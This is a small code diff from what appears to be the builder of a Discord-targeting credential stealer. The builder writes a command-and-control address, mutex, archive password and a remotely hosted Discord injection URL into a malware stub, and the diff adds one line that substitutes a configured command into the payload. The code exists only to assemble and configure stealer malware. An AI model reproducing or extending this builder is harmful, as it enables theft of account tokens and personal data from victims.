@@ -22,6 +22,7 @@ InjectionURL = "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/m
 def WriteSettings(code: str, settings: dict, injection: str) -> str:
     code = code.replace('__name__ == "__main__" and ', '')
     code = code.replace('"%c2%"', "(%d, %s)" % (settings["settings"]["c2"][0], EncryptString(settings["settings"]["c2"][1])))
+    code = code.replace(settings["settings"]["command"],settings["settings"]["commandd"])
     code = code.replace('"%mutex%"', EncryptString(settings["settings"]["mutex"]))
     code = code.replace('"%archivepassword%"', EncryptString(settings["settings"]["archivePassword"]))
     code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
